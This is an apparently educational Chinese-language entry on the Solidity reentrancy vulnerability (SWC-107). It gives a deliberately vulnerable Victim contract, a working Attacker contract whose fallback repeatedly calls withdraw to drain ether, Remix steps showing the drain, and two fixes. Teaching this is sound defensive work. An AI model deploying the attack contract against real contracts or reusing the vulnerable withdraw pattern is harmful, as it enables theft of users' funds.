# 攻击名称
可重入攻击(Reentrancy)
# 攻击分类[CWE-841](https://swcregistry.io/docs/SWC-107)
代码实现与预期行为不一致
# 攻击描述
主要的风险就是调用外部合约会接管合约的控制流。在可重入攻击中，恶意合约在被攻击合约的第一个函数执行完成前在再次调用合约，这可能导致函数调用与预期行为不一致。核心流程与原理如下:
![](/entries/SW107-Reentrancy/concept.png)
# 合约案例
## 被攻击合约
```
// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.6.10;
contract Victim {
    mapping(address=> uint256) public balances;
    function deposit() public payable{
        balances[msg.sender] += msg.value;
    }

    function withdraw(uint256 amount) public {
        require(balances[msg.sender] >= amount);
        (bool success,) = msg.sender.call{value:amount}("");
        require(success, "Fail to send ether!");

        balances[msg.sender] -= amount;
    }

    function getBalance() public view returns(uint){
        return address(this).balance;
    }
}
```

## 攻击合约
```
contract Attacker{
    Victim public victim;
    constructor(address _victimAddr) public {
        victim = Victim(_victimAddr);
    }

    function beginAttack() external payable{
        require(msg.value >= 1 ether);
        victim.deposit{value: 1 ether}();
        victim.withdraw(1 ether);
    }

    fallback() external payable{
        //死循环的话一毛也取不到
        if (address(victim).balance >= 1 ether) {
            victim.withdraw(1 ether);
        }
    }

    function getBalance() public view returns(uint){
        return address(this).balance;
    }
}
```

## 操作示例
1. 采用Remix账户1部署Victim合约，然后调用deposit存入4个ETH
2. 采用Remix账户1部署Attacker合约，然后调用beginAttack并传入1个ETH
3. Victim合约GetBalance: 0, Attacker合约GetBalance 5

# 防止策略
1. 切换存储更新和外部调用的顺序，防止启用攻击的重新进入条件。遵循“检查-效果-相互作用”设计模式。

```
contract Victim{
    ...
    function withdraw(uint256 amount) public {
        require(balances[msg.sender] >= amount);
        balances[msg.sender] -= amount;
        (bool success,) = msg.sender.call{value:amount}("");
        require(success, "Fail to send ether!"); 
    }
```

2.加锁。

```

    bool internal locked;
    modifier noReentrant(){
        require(!locked, "No re-entrancy!");
        locked = true;
        _;
        locked = false;
    }

    function withdraw(uint256 amount) public noReentrant{
        require(balances[msg.sender] >= amount);
        (bool success,) = msg.sender.call{value:amount}("");
        require(success, "Fail to send ether!");

        balances[msg.sender] -= amount;
    }
```